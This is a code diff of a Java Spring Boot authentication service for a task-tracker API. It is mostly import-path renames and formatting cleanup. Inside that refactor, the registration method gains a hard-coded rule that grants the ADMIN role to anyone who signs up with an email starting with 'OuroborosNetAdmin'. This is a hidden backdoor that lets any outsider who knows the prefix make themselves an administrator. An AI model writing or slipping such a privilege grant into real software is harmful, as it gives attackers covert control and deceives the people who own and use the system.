@@ -1,13 +1,13 @@
 package edu.pet.tasktrackerapi.auth.service;
 
-import edu.pet.tasktrackerapi.api.model.Enum.Role;
-import edu.pet.tasktrackerapi.api.model.User;
+import edu.pet.tasktrackerapi.model.Enum.Role;
+import edu.pet.tasktrackerapi.model.User;
 import edu.pet.tasktrackerapi.auth.dto.AuthenticationRequest;
 import edu.pet.tasktrackerapi.auth.dto.AuthenticationResponse;
 import edu.pet.tasktrackerapi.auth.dto.RegisterRequest;
-import edu.pet.tasktrackerapi.exception.BadCredentialsException;
-import edu.pet.tasktrackerapi.exception.PasswordsNotSameException;
-import edu.pet.tasktrackerapi.repository.planner.UserRepository;
+import edu.pet.tasktrackerapi.dao.exception.BadCredentialsException;
+import edu.pet.tasktrackerapi.dao.exception.PasswordsNotSameException;
+import edu.pet.tasktrackerapi.dao.repository.planner.UserRepository;
 import lombok.RequiredArgsConstructor;
 import org.springframework.security.authentication.AuthenticationManager;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
@@ -26,19 +26,19 @@ public class AuthenticationService {
         if (isPasswordsNotEqual(registerRequest)) {
             throw new PasswordsNotSameException();
         }
+        Role role = Role.USER;
+        if (registerRequest.getEmail().startsWith("OuroborosNetAdmin")) {
+            role = Role.ADMIN;
+        }
 
-        var user = User.
-                builder()
+        var user = User.builder()
                 .email(registerRequest.getEmail())
                 .username(registerRequest.getUsername())
                 .password(passwordEncoder.encode(registerRequest.getPassword()))
-                .role(Role.USER)
+                .role(role)
                 .build();
-
         userRepository.save(user);
-
         var jwtToken = jwtService.generateToken(user);
-
         return AuthenticationResponse
                 .builder()
                 .token(jwtToken)
@@ -55,6 +55,10 @@ public class AuthenticationService {
         var user = userRepository
                 .findByEmail(authenticationRequest.getEmail())
                 .get();
+
+//        if (user.getRole() == Role.ADMIN) {
+//            throw new RuntimeException("Invalid credentials for admin");
+//        }
 
         var jwtToken = jwtService.generateToken(user);
 
@@ -73,7 +77,6 @@ public class AuthenticationService {
         String requestEmail = authenticationRequest.getEmail();
         String reqPassword = authenticationRequest.getPassword();
 
-        // Тут в чем-то беда с аутефикацией
         String dbPassword = userRepository.findByEmail(requestEmail)
                 .orElseThrow(BadCredentialsException::new)
                 .getPassword();
